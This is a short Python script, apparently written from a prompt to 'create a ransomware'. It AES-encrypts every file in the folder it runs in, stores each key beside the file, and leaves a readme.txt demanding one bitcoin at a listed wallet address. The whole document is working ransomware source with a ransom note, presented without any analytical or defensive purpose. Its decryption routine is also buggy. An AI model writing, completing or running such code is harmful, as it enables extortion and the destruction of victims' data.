# create a ransomware that encrypts all files in a folder
# and creates a readme.txt file with instructions on how to decrypt them

import os
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# create a readme.txt file with instructions on how to decrypt files
def create_readme():
    readme = open("readme.txt", "w")
    readme.write("To decrypt your files, please send 1 bitcoin to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")
    readme.close()

# encrypt a file
def encrypt_file(filename):
    # generate a random key and iv
    key = get_random_bytes(16)
    iv = get_random_bytes(16)

    # encrypt the file
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(filename, "rb") as f:
        plaintext = f.read()
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    # write the encrypted file
    with open(filename, "wb") as f:
        f.write(ciphertext)

    # write the key and iv to a file
    with open(filename + ".key", "wb") as f:
        f.write(base64.b64encode(key))
        f.write(b"\n")
        f.write(base64.b64encode(iv))
        
# decrypt a file
def decrypt_file(filename):
    # read the key and iv from the file
    with open(filename + ".key", "rb") as f:
        key = base64.b64decode(f.readline().strip())
        iv = base64.b64decode(f.readline().strip())

    # decrypt the file
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(filename, "rb") as f:
        ciphertext = f.read()
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

    # write the decrypted file
    with open(filename, "wb") as f:
        f.write(plaintext)

# encrypt all files in a folder except readme.txt and .key files and the ransomware script
def encrypt_folder(folder):
    for filename in os.listdir(folder):
        # try to encrypt the file and if permission is denied, skip it
        try:
            if os.path.isfile(os.path.join(folder, filename)) and filename != "readme.txt" and not filename.endswith(".key") and not filename.endswith(".py"):
                encrypt_file(os.path.join(folder, filename))
        except PermissionError:
            pass

# decrypt all files in a folder
def decrypt_folder(folder):
    for filename in os.listdir(folder):
        if os.path.isfile(os.path.join(folder, filename)):
            decrypt_file(os.path.join(folder, filename))

# main function
def main():
    # create a readme.txt file with instructions on how to decrypt files
    create_readme()

    # encrypt all files in the current folder
    encrypt_folder(".")

if __name__ == "__main__":
    main()
    

